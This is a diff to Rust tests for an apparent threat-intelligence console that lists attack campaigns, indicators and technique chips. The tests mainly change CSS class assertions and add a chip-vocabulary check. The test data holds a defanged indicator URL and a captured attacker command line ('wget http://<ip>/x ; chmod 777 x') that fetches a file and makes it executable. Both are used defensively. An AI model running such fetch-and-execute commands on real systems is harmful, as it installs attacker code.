@@ -468,7 +468,10 @@ async fn the_campaign_page_shows_members_representative_and_indicators(pool: PgP
         1,
         "{page}"
     );
-    assert!(page.contains("3 hosts, 6&times;"), "{page}");
+    assert!(
+        page.contains("3 hosts, <span class=\"run-count\">x6</span>"),
+        "{page}"
+    );
     assert!(
         page.contains("<code class=\"ioc-value\">hxxp://198[.]51[.]100[.]70/kswpad</code>"),
         "{page}"
@@ -733,7 +736,7 @@ async fn pending_members_of_one_campaign_form_one_group_and_singles_stay_rows(po
         );
     }
     assert!(
-        group.contains("<span class=\"qg-count\">3 pending</span>"),
+        group.contains("<span class=\"run-count\">3 pending</span>"),
         "{group}"
     );
     assert!(group.contains("5 hosts"), "{group}");
@@ -1243,10 +1246,7 @@ async fn labels_split_into_commands_and_range_and_each_class_has_its_tab(pool: P
         row.contains("title=\"wget http://&lt;ip&gt;/x ; chmod 777 x\""),
         "full text in the title: {row}"
     );
-    assert!(
-        row.contains("<span class=\"rule rule--commands\">commands</span>"),
-        "{row}"
-    );
+    assert!(row.contains("<span class=\"sev\">commands</span>"), "{row}");
     let scan_row = between(&page, &format!("href=\"/campaigns/{scan}\""), "</tr>");
     assert!(scan_row.contains(">ssh, telnet, mqtt</a>"), "{scan_row}");
     assert!(!scan_row.contains("commands</span>"), "{scan_row}");
@@ -1455,7 +1455,8 @@ async fn untagged_pages_say_so_and_list_rows_show_chips_only_when_tagged(pool: P
         "{t}"
     );
     assert!(
-        !row_of(plain).contains("class=\"sev\""),
+        // The class chip (`commands`) is a `.sev` too; technique chips are the ones with a title.
+        !row_of(plain).contains("class=\"sev\" title="),
         "{}",
         row_of(plain)
     );
@@ -1504,7 +1505,7 @@ async fn a_list_row_shows_four_chips_and_counts_the_rest(pool: PgPool) {
     let (_, list) = console.get("/campaigns").await;
     let at = position(&list, &format!("href=\"/campaigns/{id}\""));
     let row = &list[at..at + list[at..].find("</tr>").unwrap()];
-    assert_eq!(row.matches("class=\"sev\"").count(), 4, "{row}");
+    assert_eq!(row.matches("class=\"sev\" title=").count(), 4, "{row}");
     assert!(row.contains("<span class=\"dim\">+2</span>"), "{row}");
     // Ordered by technique id: T1053.003, T1057, T1059.004, T1082 are the four; T1083, T1105 wait.
     assert!(
@@ -1625,10 +1626,22 @@ fn the_panel_check_flags_flush_content_and_passes_the_padded_parts() {
     ] {
         assert_eq!(markup::panel_violations(bad).len(), 1, "{bad}");
     }
+    let ok = r#"<span class="state-pill state-approved">approved</span>
+        <span class="tier tier-standard">Standard</span><span class="sev">commands</span>"#;
+    assert_eq!(markup::vocabulary_violations(ok), Vec::<String>::new());
+    for bad in [
+        r#"<span class="tier-aggressive">aggressive</span>"#,
+        r#"<span class="rule rule--commands">commands</span>"#,
+        r#"<a class="filter-toggle on" href="/x">shown</a>"#,
+        r#"<span class="qg-count">3 pending</span>"#,
+    ] {
+        assert_eq!(markup::vocabulary_violations(bad).len(), 1, "{bad}");
+    }
 }
 
 /// Every page the console serves, rendered from one database the real indexer filled, keeps the
-/// panel contract: nothing sits flush against a panel's border. Each page was right when the
+/// panel contract (nothing sits flush against a panel's border) and the chip vocabulary (each
+/// chip used only for its own job). Each page was right when the
 /// original design shipped; the pages added later broke it one panel at a time, so the check runs
 /// on all of them together rather than page by page.
 #[sqlx::test(migrations = false)]
@@ -1696,7 +1709,8 @@ async fn every_page_keeps_the_panel_contract(pool: PgPool) {
     ] {
         let (status, page) = console.get(&uri).await;
         assert_eq!(status, StatusCode::OK, "{uri}");
-        let found = markup::panel_violations(&page);
+        let mut found = markup::panel_violations(&page);
+        found.extend(markup::vocabulary_violations(&page));
         assert!(found.is_empty(), "{uri}:\n{}", found.join("\n"));
     }
 }
